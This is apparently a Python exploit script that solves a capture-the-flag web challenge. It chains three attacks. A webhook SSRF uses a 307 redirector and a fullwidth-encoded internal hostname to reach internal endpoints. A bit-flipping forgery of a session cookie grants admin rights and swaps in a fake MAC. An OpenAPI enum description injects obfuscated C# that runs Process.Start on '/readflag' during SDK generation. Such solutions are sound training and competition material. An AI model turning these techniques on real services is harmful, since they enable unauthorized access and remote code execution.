#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import json
import re
import sys
from http.cookies import SimpleCookie
from urllib import error, request


FULLWIDTH_INTERNAL = (
    "http://%EF%BD%89%EF%BD%8E%EF%BD%94%EF%BD%85%EF%BD%92"
    "%EF%BD%8E%EF%BD%81%EF%BD%8C:8080"
)
FALSE_OFFSET_IN_TICKET = 167
DP_HEADER_LEN = 20
DP_CONTEXT_LEN = 16
CHAIN_MATERIAL_OFFSET = DP_HEADER_LEN + DP_CONTEXT_LEN
FORGED_MAC = b"hehe" * 8
FLAG_RE = re.compile(r"HCMUS-CTF\{[^}]+\}")


def post_json(url: str, payload: dict, timeout: int = 60) -> dict:
    raw = json.dumps(payload).encode()
    req = request.Request(
        url,
        data=raw,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode())
    except error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        raise RuntimeError(f"HTTP {exc.code} from {url}: {body}") from exc


def webhook_fetch(
    public_base: str,
    redirect_url: str,
    target_path: str,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: dict | None = None,
    timeout: int = 90,
) -> dict:
    payload: dict[str, object] = {
        "url": f"{redirect_url}?to={FULLWIDTH_INTERNAL}{target_path}",
        "method": method,
        "headers": headers or {},
        "timeout": timeout,
    }
    if body is not None:
        payload["body"] = body
    return post_json(f"{public_base.rstrip('/')}/api/webhooks/test", payload, timeout=timeout + 30)


def forge_admin_cookie(set_cookie_header: str) -> tuple[str, str]:
    cookie = SimpleCookie()
    cookie.load(set_cookie_header)
    cookie_name = next(iter(cookie.keys()))
    cookie_value = cookie[cookie_name].value

    raw = bytearray(base64.urlsafe_b64decode(cookie_value + "=" * (-len(cookie_value) % 4)))
    for index, (src, dst) in enumerate(zip(b"false", b"true;")):
        raw[CHAIN_MATERIAL_OFFSET + FALSE_OFFSET_IN_TICKET + index] ^= src ^ dst
    raw[-len(FORGED_MAC) :] = FORGED_MAC

    forged_value = base64.urlsafe_b64encode(raw).decode().rstrip("=")
    return cookie_name, forged_value


def build_spec() -> dict:
    return {
        "openapi": "3.0.0",
        "info": {"title": "pwn", "version": "1.0.0"},
        "paths": {
            "/catalog": {
                "get": {
                    "responses": {
                        "200": {
                            "description": "ok",
                            "content": {
                                "application/json": {
                                    "schema": {"$ref": "#/components/schemas/CatalogItem"}
                                }
                            },
                        }
                    }
                }
            }
        },
        "components": {
            "schemas": {
                "CatalogItem": {
                    "type": "object",
                    "properties": {
                        "sku": {"type": "string"},
                        "kind": {"$ref": "#/components/schemas/PwnEnum"},
                    },
                },
                "PwnEnum": {
                    "type": "string",
                    "enum": ["one", "two", "three"],
                    "x-ms-enum": {
                        "name": "PwnEnum",
                        "modelAsString": False,
                        "values": [
                            {"value": "one", "name": "One", "description": "ok"},
                            {
                                "value": "two",
                                "name": "Two",
                                "description": (
                                    "\\n}\\n"
                                    "public partial class CatalogItem{"
                                    "public object? P="
                                    "global::Syst\\\\u0065m.Di\\\\u0061gnostics.Pro\\\\u0063ess.Start("
                                    "global::Syst\\\\u0065m.Text.Encoding.UTF8.GetString("
                                    "new byte[]{47,114,101,97,100,102,108,97,103}"
                                    "));}"
                                    "\\n#if false\\n/// "
                                ),
                            },
                            {
                                "value": "three",
                                "name": "Three",
                                "description": "\\n#endif\\npublic enum Dummy{\\n/// ",
                            },
                        ],
                    },
                },
            }
        },
    }


def solve(public_base: str, redirect_url: str) -> tuple[str, dict]:
    probe = webhook_fetch(public_base, redirect_url, "/api/me")
    if probe.get("status") != 200:
        raise RuntimeError(f"unexpected probe status: {probe}")

    headers = probe.get("headers") or {}
    set_cookie = headers.get("Set-Cookie")
    if not set_cookie:
        raise RuntimeError(f"missing Set-Cookie in probe response: {probe}")

    cookie_name, forged_cookie = forge_admin_cookie(set_cookie)
    preview = webhook_fetch(
        public_base,
        redirect_url,
        "/api/admin/sdk/preview",
        method="POST",
        headers={"Cookie": f"{cookie_name}={forged_cookie}"},
        body={
            "connectorName": "coreissues-preview",
            "environment": "sandbox",
            "ownerEmail": "ops@example.test",
            "openApi": build_spec(),
        },
    )
    if preview.get("status") != 200:
        raise RuntimeError(f"unexpected preview status: {preview}")

    inner = json.loads(preview["body"])
    stdout = inner["smokeTest"]["stdout"]
    match = FLAG_RE.search(stdout)
    if not match:
        raise RuntimeError(f"flag not found in smokeTest stdout:\n{stdout}")
    return match.group(0), inner


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Exploit Core Issues through the public webhook.")
    parser.add_argument(
        "--target",
        default="http://chall.blackpinker.com:20556",
        help="Public challenge base URL",
    )
    parser.add_argument(
        "--redirect-url",
        required=True,
        help="Public 307 redirector URL that forwards to the fullwidth internal host",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    flag, response = solve(args.target, args.redirect_url.rstrip("/"))
    print(flag)
    print(json.dumps(response, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
